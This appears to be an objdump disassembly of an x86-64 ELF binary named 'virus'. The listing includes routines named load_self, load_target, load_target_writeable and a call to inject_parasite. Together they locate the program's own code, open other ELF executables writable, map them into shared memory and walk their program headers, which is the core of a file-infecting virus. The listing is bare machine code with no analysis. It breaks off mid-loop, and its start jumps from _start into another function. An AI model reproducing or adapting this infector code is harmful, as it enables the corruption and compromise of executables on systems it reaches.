
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  400e47:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400e4b:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e4f:	48 8b 50 20          	mov    rdx,QWORD PTR [rax+0x20]
  400e53:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400e57:	48 01 c2             	add    rdx,rax
  400e5a:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e5e:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400e62:	48 8b 7d a8          	mov    rdi,QWORD PTR [rbp-0x58]
  400e66:	48 8b 8d 08 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xf8]
  400e6d:	48 8b 95 00 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x100]
  400e74:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  400e78:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400e7c:	49 89 f8             	mov    r8,rdi
  400e7f:	48 89 c7             	mov    rdi,rax
  400e82:	e8 39 f7 ff ff       	call   4005c0 <inject_parasite>
  400e87:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400e8b:	c9                   	leave  
  400e8c:	c3                   	ret    

0000000000400e8d <load_self>:
  400e8d:	f3 0f 1e fa          	endbr64 
  400e91:	55                   	push   rbp
  400e92:	48 89 e5             	mov    rbp,rsp
  400e95:	48 83 ec 30          	sub    rsp,0x30
  400e99:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400e9d:	e8 a0 1e 00 00       	call   402d42 <get_rip>
  400ea2:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  400ea9:	48 89 d1             	mov    rcx,rdx
  400eac:	48 c7 c2 5d 2d 40 00 	mov    rdx,0x402d5d
  400eb3:	48 29 d1             	sub    rcx,rdx
  400eb6:	48 89 ca             	mov    rdx,rcx
  400eb9:	48 29 d0             	sub    rax,rdx
  400ebc:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400ec0:	e8 7d 1e 00 00       	call   402d42 <get_rip>
  400ec5:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  400ecc:	48 89 d1             	mov    rcx,rdx
  400ecf:	48 c7 c2 72 2d 40 00 	mov    rdx,0x402d72
  400ed6:	48 29 d1             	sub    rcx,rdx
  400ed9:	48 89 ca             	mov    rdx,rcx
  400edc:	48 29 d0             	sub    rax,rdx
  400edf:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400ee3:	e8 5a 1e 00 00       	call   402d42 <get_rip>
  400ee8:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  400eef:	48 89 d1             	mov    rcx,rdx
  400ef2:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  400ef9:	48 29 d1             	sub    rcx,rdx
  400efc:	48 89 ca             	mov    rdx,rcx
  400eff:	48 29 d0             	sub    rax,rdx
  400f02:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400f06:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400f0a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f0e:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  400f12:	48 c7 c0 5d 2d 40 00 	mov    rax,0x402d5d
  400f19:	48 89 c2             	mov    rdx,rax
  400f1c:	48 c7 c0 9c 01 40 00 	mov    rax,0x40019c
  400f23:	48 29 c2             	sub    rdx,rax
  400f26:	48 89 d0             	mov    rax,rdx
  400f29:	48 89 c2             	mov    rdx,rax
  400f2c:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f30:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f34:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f38:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400f3c:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400f40:	48 2b 45 f8          	sub    rax,QWORD PTR [rbp-0x8]
  400f44:	48 98                	cdqe   
  400f46:	48 01 c2             	add    rdx,rax
  400f49:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f4d:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f51:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f55:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400f59:	48 8d 90 68 42 00 00 	lea    rdx,[rax+0x4268]
  400f60:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f64:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f68:	b8 00 00 00 00       	mov    eax,0x0
  400f6d:	c9                   	leave  
  400f6e:	c3                   	ret    

0000000000400f6f <unload_target>:
  400f6f:	f3 0f 1e fa          	endbr64 
  400f73:	55                   	push   rbp
  400f74:	48 89 e5             	mov    rbp,rsp
  400f77:	48 83 ec 10          	sub    rsp,0x10
  400f7b:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400f7f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f83:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400f87:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f8b:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  400f8f:	48 89 d6             	mov    rsi,rdx
  400f92:	48 89 c7             	mov    rdi,rax
  400f95:	e8 29 13 00 00       	call   4022c3 <_munmap>
  400f9a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f9e:	8b 80 f8 00 00 00    	mov    eax,DWORD PTR [rax+0xf8]
  400fa4:	89 c7                	mov    edi,eax
  400fa6:	e8 4c 11 00 00       	call   4020f7 <_close>
  400fab:	90                   	nop
  400fac:	c9                   	leave  
  400fad:	c3                   	ret    

0000000000400fae <load_target>:
  400fae:	f3 0f 1e fa          	endbr64 
  400fb2:	55                   	push   rbp
  400fb3:	48 89 e5             	mov    rbp,rsp
  400fb6:	53                   	push   rbx
  400fb7:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  400fbe:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  400fc5:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  400fcc:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  400fd3:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  400fda:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  400fde:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  400fe5:	ba 00 00 00 00       	mov    edx,0x0
  400fea:	be 00 00 00 00       	mov    esi,0x0
  400fef:	48 89 c7             	mov    rdi,rax
  400ff2:	e8 ca 10 00 00       	call   4020c1 <_open>
  400ff7:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  400ffa:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  400ffe:	79 0a                	jns    40100a <load_target+0x5c>
  401000:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401005:	e9 b1 03 00 00       	jmp    4013bb <load_target+0x40d>
  40100a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401011:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  401014:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  40101a:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  40101d:	48 98                	cdqe   
  40101f:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  401026:	48 89 d6             	mov    rsi,rdx
  401029:	48 89 c7             	mov    rdi,rax
  40102c:	e8 50 11 00 00       	call   402181 <_fstat>
  401031:	85 c0                	test   eax,eax
  401033:	79 0a                	jns    40103f <load_target+0x91>
  401035:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40103a:	e9 7c 03 00 00       	jmp    4013bb <load_target+0x40d>
  40103f:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  401042:	48 63 d0             	movsxd rdx,eax
  401045:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401049:	41 b9 00 00 00 00    	mov    r9d,0x0
  40104f:	49 89 d0             	mov    r8,rdx
  401052:	b9 02 00 00 00       	mov    ecx,0x2
  401057:	ba 03 00 00 00       	mov    edx,0x3
  40105c:	48 89 c6             	mov    rsi,rax
  40105f:	bf 00 00 00 00       	mov    edi,0x0
  401064:	e8 f4 11 00 00       	call   40225d <_mmap>
  401069:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  401070:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  401074:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40107b:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40107f:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  401083:	75 0a                	jne    40108f <load_target+0xe1>
  401085:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40108a:	e9 2c 03 00 00       	jmp    4013bb <load_target+0x40d>
  40108f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401096:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40109a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010a1:	48 89 10             	mov    QWORD PTR [rax],rdx
  4010a4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010ab:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4010af:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010b6:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4010b9:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4010bd:	48 01 c2             	add    rdx,rax
  4010c0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010c7:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4010cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010d2:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4010d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010dd:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4010e0:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4010e4:	48 01 c2             	add    rdx,rax
  4010e7:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010ee:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  4010f2:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  4010f9:	e9 b6 01 00 00       	jmp    4012b4 <load_target+0x306>
  4010fe:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401105:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401109:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40110c:	48 63 d0             	movsxd rdx,eax
  40110f:	48 89 d0             	mov    rax,rdx
  401112:	48 c1 e0 03          	shl    rax,0x3
  401116:	48 29 d0             	sub    rax,rdx
  401119:	48 c1 e0 03          	shl    rax,0x3
  40111d:	48 01 c8             	add    rax,rcx
  401120:	8b 00                	mov    eax,DWORD PTR [rax]
  401122:	83 f8 01             	cmp    eax,0x1
  401125:	74 0e                	je     401135 <load_target+0x187>
  401127:	83 f8 02             	cmp    eax,0x2
  40112a:	0f 84 3f 01 00 00    	je     40126f <load_target+0x2c1>
  401130:	e9 7b 01 00 00       	jmp    4012b0 <load_target+0x302>
  401135:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40113c:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401140:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401143:	48 63 d0             	movsxd rdx,eax
  401146:	48 89 d0             	mov    rax,rdx
  401149:	48 c1 e0 03          	shl    rax,0x3
  40114d:	48 29 d0             	sub    rax,rdx
  401150:	48 c1 e0 03          	shl    rax,0x3
  401154:	48 01 c8             	add    rax,rcx
  401157:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  40115b:	48 85 c0             	test   rax,rax
  40115e:	0f 95 c0             	setne  al
  401161:	0f b6 c0             	movzx  eax,al
  401164:	85 c0                	test   eax,eax
  401166:	74 0a                	je     401172 <load_target+0x1c4>
  401168:	83 f8 01             	cmp    eax,0x1
  40116b:	74 6c                	je     4011d9 <load_target+0x22b>
  40116d:	e9 3e 01 00 00       	jmp    4012b0 <load_target+0x302>
  401172:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401179:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40117d:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401180:	48 63 d0             	movsxd rdx,eax
  401183:	48 89 d0             	mov    rax,rdx
  401186:	48 c1 e0 03          	shl    rax,0x3
  40118a:	48 29 d0             	sub    rax,rdx
  40118d:	48 c1 e0 03          	shl    rax,0x3
  401191:	48 01 c8             	add    rax,rcx
  401194:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401198:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40119f:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  4011a3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011aa:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011ae:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011b1:	48 63 d0             	movsxd rdx,eax
  4011b4:	48 89 d0             	mov    rax,rdx
  4011b7:	48 c1 e0 03          	shl    rax,0x3
  4011bb:	48 29 d0             	sub    rax,rdx
  4011be:	48 c1 e0 03          	shl    rax,0x3
  4011c2:	48 01 c8             	add    rax,rcx
  4011c5:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4011c9:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011d0:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  4011d4:	e9 94 00 00 00       	jmp    40126d <load_target+0x2bf>
  4011d9:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011e0:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011e4:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011e7:	48 63 d0             	movsxd rdx,eax
  4011ea:	48 89 d0             	mov    rax,rdx
  4011ed:	48 c1 e0 03          	shl    rax,0x3
  4011f1:	48 29 d0             	sub    rax,rdx
  4011f4:	48 c1 e0 03          	shl    rax,0x3
  4011f8:	48 01 c8             	add    rax,rcx
  4011fb:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4011ff:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401206:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  40120a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401211:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401215:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401218:	48 63 d0             	movsxd rdx,eax
  40121b:	48 89 d0             	mov    rax,rdx
  40121e:	48 c1 e0 03          	shl    rax,0x3
  401222:	48 29 d0             	sub    rax,rdx
  401225:	48 c1 e0 03          	shl    rax,0x3
  401229:	48 01 c8             	add    rax,rcx
  40122c:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401230:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401237:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  40123b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401242:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401246:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401249:	48 63 d0             	movsxd rdx,eax
  40124c:	48 89 d0             	mov    rax,rdx
  40124f:	48 c1 e0 03          	shl    rax,0x3
  401253:	48 29 d0             	sub    rax,rdx
  401256:	48 c1 e0 03          	shl    rax,0x3
  40125a:	48 01 c8             	add    rax,rcx
  40125d:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401261:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401268:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  40126c:	90                   	nop
  40126d:	eb 41                	jmp    4012b0 <load_target+0x302>
  40126f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401276:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  40127a:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401281:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  401285:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401288:	48 63 d0             	movsxd rdx,eax
  40128b:	48 89 d0             	mov    rax,rdx
  40128e:	48 c1 e0 03          	shl    rax,0x3
  401292:	48 29 d0             	sub    rax,rdx
  401295:	48 c1 e0 03          	shl    rax,0x3
  401299:	48 01 f0             	add    rax,rsi
  40129c:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4012a0:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  4012a4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4012ab:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  4012af:	90                   	nop
  4012b0:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  4012b4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4012bb:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4012be:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  4012c2:	0f b7 c0             	movzx  eax,ax
  4012c5:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  4012c8:	0f 8c 30 fe ff ff    	jl     4010fe <load_target+0x150>
  4012ce:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4012d5:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  4012dc:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  4012e3:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  4012e7:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  4012eb:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  4012f2:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  4012f9:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  4012fd:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  401304:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  40130b:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  401312:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  401319:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  401320:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  401324:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  401328:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  40132f:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  401336:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  40133a:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  40133e:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  401345:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  40134c:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  401350:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  401354:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  40135b:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  401362:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  401366:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  40136a:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  401371:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  401378:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  40137c:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  401380:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  401387:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  40138e:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  401392:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  401396:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  40139d:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  4013a4:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  4013a8:	48 89 c2             	mov    rdx,rax
  4013ab:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4013b2:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  4013b6:	b8 00 00 00 00       	mov    eax,0x0
  4013bb:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  4013c2:	5b                   	pop    rbx
  4013c3:	5d                   	pop    rbp
  4013c4:	c3                   	ret    

00000000004013c5 <load_target_writeable>:
  4013c5:	f3 0f 1e fa          	endbr64 
  4013c9:	55                   	push   rbp
  4013ca:	48 89 e5             	mov    rbp,rsp
  4013cd:	53                   	push   rbx
  4013ce:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  4013d5:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  4013dc:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  4013e3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4013ea:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  4013f1:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  4013f5:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  4013fc:	ba 00 00 00 00       	mov    edx,0x0
  401401:	be 02 00 00 00       	mov    esi,0x2
  401406:	48 89 c7             	mov    rdi,rax
  401409:	e8 b3 0c 00 00       	call   4020c1 <_open>
  40140e:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  401411:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  401415:	79 0a                	jns    401421 <load_target_writeable+0x5c>
  401417:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40141c:	e9 b1 03 00 00       	jmp    4017d2 <load_target_writeable+0x40d>
  401421:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401428:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  40142b:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  401431:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  401434:	48 98                	cdqe   
  401436:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  40143d:	48 89 d6             	mov    rsi,rdx
  401440:	48 89 c7             	mov    rdi,rax
  401443:	e8 39 0d 00 00       	call   402181 <_fstat>
  401448:	85 c0                	test   eax,eax
  40144a:	79 0a                	jns    401456 <load_target_writeable+0x91>
  40144c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401451:	e9 7c 03 00 00       	jmp    4017d2 <load_target_writeable+0x40d>
  401456:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  401459:	48 63 d0             	movsxd rdx,eax
  40145c:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401460:	41 b9 00 00 00 00    	mov    r9d,0x0
  401466:	49 89 d0             	mov    r8,rdx
  401469:	b9 01 00 00 00       	mov    ecx,0x1
  40146e:	ba 03 00 00 00       	mov    edx,0x3
  401473:	48 89 c6             	mov    rsi,rax
  401476:	bf 00 00 00 00       	mov    edi,0x0
  40147b:	e8 dd 0d 00 00       	call   40225d <_mmap>
  401480:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  401487:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  40148b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401492:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  401496:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  40149a:	75 0a                	jne    4014a6 <load_target_writeable+0xe1>
  40149c:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4014a1:	e9 2c 03 00 00       	jmp    4017d2 <load_target_writeable+0x40d>
  4014a6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014ad:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014b1:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014b8:	48 89 10             	mov    QWORD PTR [rax],rdx
  4014bb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014c2:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014c6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014cd:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4014d0:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4014d4:	48 01 c2             	add    rdx,rax
  4014d7:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014de:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  4014e2:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014e9:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014ed:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014f4:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4014f7:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4014fb:	48 01 c2             	add    rdx,rax
  4014fe:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401505:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  401509:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  401510:	e9 b6 01 00 00       	jmp    4016cb <load_target_writeable+0x306>
